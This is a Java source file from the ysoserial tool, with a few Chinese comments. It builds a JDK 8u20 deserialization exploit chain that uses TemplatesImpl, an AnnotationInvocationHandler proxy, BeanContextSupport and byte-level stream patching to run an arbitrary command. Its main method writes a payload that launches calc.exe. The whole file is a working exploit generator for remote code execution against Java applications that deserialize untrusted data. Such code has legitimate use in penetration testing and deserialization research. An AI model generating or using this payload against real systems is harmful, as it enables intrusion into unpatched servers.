 package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.util.ByteUtil;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.ReadWrite;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

 public class Jdk8u20_my implements ObjectPayload{
     public static Class newInvocationHandlerClass() throws Exception{
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);
         CtMethod writeObject = CtMethod.make("    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException {\n" +
             "        os.defaultWriteObject();\n" +
             "    }",clazz);
         clazz.addMethod(writeObject);
         Class c = clazz.toClass();
         return c;
     }

     public byte[] getPayload(final String command) throws Exception {
         TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);

         Class ihClass = newInvocationHandlerClass();
         InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(ihClass).newInstance(Override.class,new HashMap<>());

         Reflections.setFieldValue(ih,"type", Templates.class);
         Templates proxy = Gadgets.createProxy(ih,Templates.class);

         BeanContextSupport b = new BeanContextSupport();
         Reflections.setFieldValue(b,"serializable",1);
         HashMap tmpMap = new HashMap<>();
         tmpMap.put(ih,null);
         Reflections.setFieldValue(b,"children",tmpMap);


         LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy
         set.add(b);
         set.add(templates);
         set.add(proxy);

         HashMap hm = new HashMap();
         hm.put("f5a5a608",templates);
         Reflections.setFieldValue(ih,"memberValues",hm);

         byte[] ser = Serializer.serialize(set);

         byte[] shoudReplace = new byte[]{0x78,0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71};

         int i = ByteUtil.getSubarrayIndex(ser,shoudReplace);
         ser = ByteUtil.deleteAt(ser,i); // delete 0x78
         ser = ByteUtil.deleteAt(ser,i); // delete 0x70

         return ser;
     }

     public static void main(final String[] args) throws Exception {
         byte[] ser = new Jdk8u20_my().getPayload("calc.exe");
         ReadWrite.writeFile(ser,"ser.txt");

         // 不能直接 Deserializer.deserialize(ser) , 除非 redefine 了 AnnotationInvocationHandler 否则会报错
//         Deserializer.deserialize(ser);
     }

     @Override
     public Object getObject(String command) throws Exception {
         return getPayload(command);
     }
 }
